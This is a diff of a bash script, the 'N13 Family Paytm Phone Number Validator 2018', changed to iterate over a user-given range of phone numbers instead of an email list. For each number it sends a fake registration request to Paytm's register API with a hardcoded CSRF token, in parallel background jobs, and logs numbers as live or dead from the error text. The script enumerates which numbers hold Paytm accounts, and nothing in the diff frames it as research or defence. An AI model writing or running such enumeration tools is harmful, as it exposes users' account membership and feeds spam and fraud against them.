@@ -19,7 +19,7 @@ cat <<EOF
           [+] albamzz0@gmail.com [+]
         
 ---------------------------------------------------
-   N13 Family - Paytm Email Validator 2018
+   N13 Family - Paytm Phone Number Validator 2018
 ---------------------------------------------------
 
 EOF
@@ -92,11 +92,19 @@ SECONDS=0
 
 # Asking user whenever the
 # parameter is blank or null
-if [[ $inputFile == '' ]]; then
+
+if [[ $inputStart == '' ]]; then
   # Print available file on
   # current folder
   # clear
-  read -p "Enter mailist file: " inputFile
+  read -p "Enter Start number: " inputStart
+fi
+
+if [[ $inputEnd == '' ]]; then
+  # Print available file on
+  # current folder
+  # clear
+  read -p "Enter End number: " inputEnd
 fi
 
 if [[ $targetFolder == '' ]]; then
@@ -119,10 +127,6 @@ else
   fi
 fi
 
-if [[ $isDel == '' || $cli_mode == 'interactive' ]]; then
-  read -p "Delete list per check ? [y/n]: " isDel
-fi
-
 if [[ $sendList == '' ]]; then
   read -p "How many list send: " sendList
 fi
@@ -136,22 +140,21 @@ n13_paytm() {
 
   check=`curl 'https://accounts.paytm.com/v3/api/register' -H 'origin: https://accounts.paytm.com' -H 'accept-encoding: gzip, deflate, br' -H 'accept-language: en-US,en;q=0.9,id;q=0.8' -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.67 Safari/537.36' -H 'content-type: application/json' -H 'accept: application/json, text/plain, */*' -H 'referer: https://accounts.paytm.com/oauth2/authorize?theme=mp-web&redirect_uri=https%3A%2F%2Fpaytm.com%2Fv1%2Fapi%2Fauthresponse&is_verification_excluded=false&client_id=paytm-web-secure&type=web_server&scope=paytm&response_type=code' -H 'authority: accounts.paytm.com' --data-binary '{"email":"","mobile":"'$1'","loginPassword":"123aa","csrfToken":"e44e559d604e515dba067418d3f7a3ca","redirectUri":"https://paytm.com/v1/api/authresponse","clientId":"paytm-web-secure","scope":"paytm","state":"","responseType":"code","theme":"mp-web","dob_agreement":true}' --compressed -D - -s`
   duration=$SECONDS
-  header="`date +%H:%M:%S` from $inputFile to $targetFolder"
-  footer="- ${NC}[$2/$3] ${MAGENTA} [N13 - paytmid 2018] $(($duration % 60))sec. ${NC}\n"
   val="$(echo "$check" | grep -c 'The mobile number you entered already exists with another account')"
   inv="$(echo "$check" | grep -c 'CSRF Token validation error')"
   bad="$(echo "$check" | grep -c 'Email must be valid.')"
   icl="$(echo "$check" | grep -c 'This mobile number already exists with another account.')"
+  basd="$(echo "$check" | grep -c 'Bad Request')"
 
   if [[ $val > 0 || $icl > 0 ]]; then
-    printf "${GRN}[LIVE] => $1 ${NC} $footer"
-    echo "LIVE => $1" >> $4/live.txt
+    printf "${GRN}[LIVE] => $1 ${NC}\n"
+    echo "LIVE => $1" >> $2/live.txt
   else
-    if [[ $inv > 0 || $bad > 0 ]]; then
-      printf "${RED}[DIE] => $1 ${NC} $footer"
-      echo "DIE => $1" >> $4/die.txt
+    if [[ $inv > 0 || $bad > 0 || basd > 0 ]]; then
+      printf "${RED}[DIE] => $1 ${NC}\n"
+      echo "DIE => $1" >> $2/die.txt
     else
-      printf "${CYAN}[UNKNOWN] => $1 ${NC} $footer"
+      printf "${CYAN}[UNKNOWN] => $1 ${NC}\n"
       echo "$1 => $check" >> reason.txt
     fi
   fi
@@ -159,35 +162,23 @@ n13_paytm() {
   printf "\r"
 }
 
-if [[ ! -f $inputFile ]]; then
-  echo "[404] File mailist not found. Check your mailist file name."
-  ls -l
-  exit
-fi
 
 # Preparing file list 
 # by using email pattern 
 # every line in $inputFile
-echo "[+] Cleaning your mailist file"
-grep -Eiorh '[0-9]+' $inputFile | tr '[:upper:]' '[:lower:]' | sort | uniq > temp_list && mv temp_list $inputFile
 
 # Fi
 # Finding match mail provider
 echo "########################################"
 # Print total line of mailist
-totalLines=`wc -l < $inputFile`
-echo "There are $totalLines of list."
-echo " "
-
 # Extract email per line
 # from both input file
-IFS=$'\r\n' GLOBIGNORE='*' command eval  'mailist=($(cat $inputFile))'
 con=1
 
 echo "[+] Sending $sendList email per $perSec seconds"
 
-for (( i = 0; i < "${#mailist[@]}"; i++ )); do
-  username="${mailist[$i]}"
+for (( i = $inputStart; i < $inputEnd; i++ )); do
+  nomorsatu="$i"
   indexer=$((con++))
   tot=$((totalLines--))
   fold=`expr $i % $sendList`
@@ -200,11 +191,8 @@ for (( i = 0; i < "${#mailist[@]}"; i++ )); do
   vander=`expr $i % 8`
 
   
-  n13_paytm "$username" "$indexer" "$tot" "$targetFolder" "$inputFile" &
+  n13_paytm "$nomorsatu" "$targetFolder" &
 
-  if [[ $isDel == 'y' ]]; then
-    grep -v -- "$username" $inputFile > "$inputFile"_temp && mv "$inputFile"_temp $inputFile
-  fi
 done 
 
 # waiting the background process to be done
